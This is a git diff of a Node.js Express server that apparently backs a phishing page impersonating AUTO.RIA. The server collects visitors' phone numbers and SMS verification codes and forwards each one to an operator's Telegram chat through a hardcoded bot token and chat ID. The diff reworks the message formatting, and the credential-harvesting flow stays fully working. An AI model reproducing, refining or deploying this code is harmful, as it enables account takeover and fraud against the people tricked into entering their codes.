@@ -6,82 +6,76 @@ const fetch = require('node-fetch');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// === КОНФІГУРАЦІЯ TELEGRAM ===
+// === TELEGRAM CONFIG ===
 const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
 const CHAT_ID = "-5055127448";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-// ==============================
+// ======================
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, '/')));
 
-/**
- * Функція для відправки повідомлення у Telegram
- * Використовуємо MarkdownV2 для клікабельного номера
- */
-async function sendToTelegram(message) {
-    const params = {
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'MarkdownV2'
-    };
+// Екранування для MarkdownV2
+const escape = (text) => text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
 
+async function sendToTelegram(message) {
     try {
-        const response = await fetch(TELEGRAM_API, {
+        const res = await fetch(TELEGRAM_API, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(params)
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'MarkdownV2'
+            })
         });
 
-        if (!response.ok) {
-            const errorData = await response.json();
-            console.error('Помилка API Telegram:', response.status, errorData);
+        if (!res.ok) {
+            const err = await res.json();
+            console.error('Telegram error:', err);
             return false;
         }
-
-        const data = await response.json();
-        return data.ok;
-    } catch (error) {
-        console.error('Помилка відправки:', error);
+        return true;
+    } catch (err) {
+        console.error('Send error:', err);
         return false;
     }
 }
 
-// Ендпоінт для прийому даних
+// API: /api/send-data
 app.post('/api/send-data', async (req, res) => {
     const { step, phone, code } = req.body;
     let message = '';
 
-    // Екранування спеціальних символів для MarkdownV2
-    const escapeMarkdown = (text) => {
-        return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
-    };
-
     if (step === 'phone' && phone) {
-        const cleanPhone = phone.replace(/\D/g, ''); // тільки цифри
-        const formattedPhone = phone.startsWith('+') ? phone : `+${cleanPhone}`;
-        const clickablePhone = `[${escapeMarkdown(formattedPhone)}](tg://msg?url=${encodeURIComponent(formattedPhone)})`;
+        // Очищаємо і форматуємо номер
+        const clean = phone.replace(/\D/g, '');
+        const formatted = clean.startsWith('380') ? `+${clean}` : phone;
 
-        message = `Проект: *AUTO\\.RIA*\nНомер телефона: ${clickablePhone}\nСтрана: *Украина*`;
+        message = `
+*AUTO\\.RIA*  
+*Номер телефона:* \`${escape(formatted)}\`  
+*Страна:* Україна
+        `.trim();
 
     } else if (step === 'code' && code) {
-        message = `Code:\n\`${escapeMarkdown(code)}\``;
+        message = `
+*SMS\\-код:*  
+\`\`\`
+${escape(code)}
+\`\`\`
+        `.trim();
 
     } else {
-        return res.status(400).json({ success: false, message: 'Неправильні дані.' });
+        return res.status(400).json({ success: false });
     }
 
     const success = await sendToTelegram(message);
-
-    if (success) {
-        res.json({ success: true });
-    } else {
-        res.status(500).json({ success: false, message: 'Помилка відправки.' });
-    }
+    res.json({ success });
 });
 
 // Запуск
 app.listen(port, () => {
-    console.log(`Сервер запущено на порту ${port}`);
+    console.log(`Сервер на порту ${port}`);
 });
